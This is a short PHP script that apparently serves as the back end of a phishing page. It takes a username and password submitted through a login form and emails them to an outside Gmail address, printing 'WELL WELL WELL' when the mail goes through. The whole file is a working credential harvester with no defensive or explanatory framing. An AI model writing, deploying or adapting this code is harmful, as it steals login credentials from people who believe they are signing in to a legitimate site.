<?php


$username = $_POST['username'];
$password = $_POST['password'];



$message = "$username + $password";

$to = 'heandsup555@gmail.com';


if (mail($to, $password, $message, "From: lolginator555@gmail.com")) {
    echo "WELL WELL WELL";
}



?>